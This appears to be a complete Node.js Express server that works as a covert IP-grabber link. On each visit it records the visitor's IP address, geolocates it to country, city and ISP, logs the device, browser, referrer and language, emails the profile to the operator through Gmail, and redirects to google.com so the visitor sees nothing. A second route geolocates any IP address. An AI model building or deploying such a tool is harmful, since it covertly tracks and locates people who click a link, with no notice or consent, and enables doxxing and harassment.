import dotenv from "dotenv";
import express from "express";
import fetch from "node-fetch";
import nodemailer from "nodemailer";
import { UAParser } from "ua-parser-js";

dotenv.config();
const app = express();
const PORT = process.env.PORT || 3000;

app.set("trust proxy", true);

// Email setup
const transporter = nodemailer.createTransport({
	service: "gmail",
	auth: {
		user: process.env.GMAIL_USER,
		pass: process.env.GMAIL_PASS,
	},
});

// ======================
// 1️⃣ Visitor IP Logger
// ======================
app.get("/", async (req, res) => {
	const userIP =
		req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
	const parser = new UAParser();
	const ua = parser.setUA(req.headers["user-agent"]).getResult();
	const referer = req.headers["referer"] || "Direct";
	const language = req.headers["accept-language"] || "Unknown";

	try {
		const geoRes = await fetch(`http://ip-api.com/json/${userIP}`);
		const geo = await geoRes.json();
		const now = new Date().toLocaleString();

		const message = `
✅ New visitor logged:

📍 IP: ${userIP}
🌎 Country: ${geo.country}
🏙️ City: ${geo.city}
🏢 ISP: ${geo.isp}
🕒 Time: ${now}

🧠 Device: ${ua.device.type || "Desktop"}
🛠️ OS: ${ua.os.name} ${ua.os.version}
🌐 Browser: ${ua.browser.name} ${ua.browser.version}

🔗 Referrer: ${referer}
🗣️ Language: ${language}
    `.trim();

		await transporter.sendMail({
			from: `"IP Logger" <${process.env.GMAIL_USER}>`,
			to: process.env.GMAIL_TO,
			subject: "📩 New IP Visit Logged",
			text: message,
		});

		res.redirect("https://google.com");
	} catch (err) {
		console.error("❌ Logging error:", err);
		res.status(500).send("Error logging IP.");
	}
});

// ======================
// 2️⃣ IP Lookup Tool
// ======================
app.get("/lookup/:ip", async (req, res) => {
	const targetIP = req.params.ip;

	try {
		const geoRes = await fetch(`http://ip-api.com/json/${targetIP}`);
		const data = await geoRes.json();
		res.json(data);
	} catch (err) {
		console.error("❌ Lookup error:", err);
		res.status(500).send("Error looking up IP.");
	}
});

app.listen(PORT, () => {
	console.log(`✅ Server running on port ${PORT}`);
});
